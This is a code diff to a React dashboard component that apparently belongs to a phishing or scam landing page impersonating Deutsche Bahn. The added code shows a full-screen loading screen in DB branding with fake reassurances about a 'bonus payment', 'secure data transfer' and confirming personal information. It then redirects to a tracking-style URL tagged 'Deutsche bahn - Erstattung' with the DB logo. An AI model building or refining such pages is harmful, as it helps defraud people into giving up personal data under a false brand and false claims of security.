@@ -1,14 +1,81 @@
 
-import React, { useCallback } from 'react';
+import React, { useCallback, useState } from 'react';
 import Header from '../components/Header';
 import Footer from '../components/Footer';
 import { Euro } from 'lucide-react';
 import { Button } from '../components/ui/button';
 
 const Dashboard = () => {
+  const [showLoadingScreen, setShowLoadingScreen] = useState(false);
+  const [currentMessageIndex, setCurrentMessageIndex] = useState(0);
+
+  const messages = [
+    "We are redirecting you to a secure page to confirm your personal information...",
+    "Verifying your eligibility for the bonus payment...",
+    "Preparing secure data transfer...",
+    "Establishing secure connection...",
+    "Finalizing redirection..."
+  ];
+
   const handleRedirect = useCallback(() => {
-    window.open('https://site.com', '_blank', 'noopener,noreferrer');
-  }, []);
+    // Show loading screen
+    setShowLoadingScreen(true);
+    setCurrentMessageIndex(0);
+
+    // Cycle through messages
+    const messageInterval = setInterval(() => {
+      setCurrentMessageIndex((prev) => (prev + 1) % messages.length);
+    }, 2000);
+
+    // After 10 seconds, redirect
+    setTimeout(() => {
+      clearInterval(messageInterval);
+      
+      // Generate random number for sub_id_4
+      const randomNumber = Math.floor(Math.random() * 100000);
+      const subId4 = `Deutsche bahn - Erstattung - ${randomNumber}`;
+      const subId5 = 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Deutsche_Bahn_AG-Logo.svg/1200px-Deutsche_Bahn_AG-Logo.svg.png';
+      
+      const redirectUrl = `/?_lp=1&sub_id_4=${encodeURIComponent(subId4)}&sub_id_5=${encodeURIComponent(subId5)}`;
+      
+      // Open in a new tab
+      window.open(redirectUrl, '_blank');
+      
+      // Reset loading state
+      setShowLoadingScreen(false);
+    }, 10000);
+  }, [messages]);
+
+  // Loading screen component
+  if (showLoadingScreen) {
+    return (
+      <div className="fixed inset-0 z-[9999] min-h-screen flex items-center justify-center bg-[#eceae8]">
+        <div className="text-center">
+          <div className="flex justify-center space-x-2 mb-8">
+            {[0, 200, 400].map((delay, index) => (
+              <div 
+                key={index}
+                className="w-4 h-4 rounded-sm bg-[#009ee0] animate-bounce"
+                style={{ 
+                  animationDelay: `${delay}ms`,
+                  animationDuration: '1.4s'
+                }}
+              />
+            ))}
+          </div>
+          
+          <div className="h-12 flex items-center justify-center px-4">
+            <p 
+              key={currentMessageIndex}
+              className="text-lg text-gray-700 font-medium animate-fade-in text-center max-w-md"
+            >
+              {messages[currentMessageIndex]}
+            </p>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-[#eceae8]">
